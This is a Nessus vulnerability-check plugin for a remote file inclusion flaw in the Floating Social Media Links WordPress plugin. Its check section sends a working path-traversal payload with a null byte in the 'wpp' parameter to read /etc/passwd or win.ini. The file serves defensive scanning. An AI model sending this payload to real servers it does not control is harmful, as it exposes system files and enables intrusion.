#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64243);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(56913);
  script_osvdb_id(88385);

  script_name(english:"Floating Social Media Links Plugin for WordPress 'wpp' Parameter Remote File Inclusion");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Floating Social Media Links Plugin for WordPress installed on the
remote host is affected by a remote file inclusion vulnerability due
to a failure to properly sanitize user-supplied input to the 'wpp'
parameter of the 'fsml-hideshow.js.php' script. This vulnerability
could allow an unauthenticated, remote attacker to view arbitrary
files or execute arbitrary PHP code, possibly taken from third-party
hosts, on the remote host.

Note that the install is likely to have a similar vulnerability
involving the 'fsml-admin.js.php' script, although Nessus has not
checked for that issue.");
  # http://ceriksen.com/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4717aaff");
  # http://wordpress.org/extend/plugins/floating-social-media-links/changelog/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e1a6367d");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.4.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/12/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'Floating Social Media Links';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";

  checks[path + "floating-social-media-links/fsml-image-upload.js"][0] =
    make_list('media-upload\\.php\\?type');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  attack =  mult_str(str:"../", nb:12) + file;
  url = "/wp-content/plugins/floating-social-media-links/fsml-hideshow.js.php"+
    "?wpp=" + attack + "%00";

  res = http_send_recv3(
    method    : "GET",
    item      : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );
  body = res[2];

   # Check for errors
  error_returned = FALSE;
  if (
    !isnull(body) &&
    (
      # magic_quotes_gpc
      (attack + '\\0/wp-load.php): failed to open stream:' >< body) ||
      (attack + '\\0/wp-load.php) [function.' >< body) ||
      (attack + '\\0/wp-load.php'+") [<a href='function." >< body) ||
      # open_basedir
      ("Failed opening required '" + attack >< body) ||
      ("open_basedir restriction in effect. File(" + attack >< body)
    )
  ) error_returned = TRUE;
  pat = file_pats[file];

  if ((body =~ pat) || (error_returned))
  {
    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      if (error_returned)
      {
        report =
          '\nNessus was not able to exploit the issue, but was able to verify'+
          ' it' + '\nexists by examining the error message returned from the' +
          ' following' + '\nrequest :' +
          '\n' +
          '\n' + install_url + url +
          '\n';
      }
      else
      {
        report =
          '\nNessus was able to exploit the issue to retrieve the contents of '+
          '\n'+ "'" + file + "'" + ' using the following request :' +
          '\n' +
          '\n' + install_url + url +
          '\n';
      }
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(body) +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
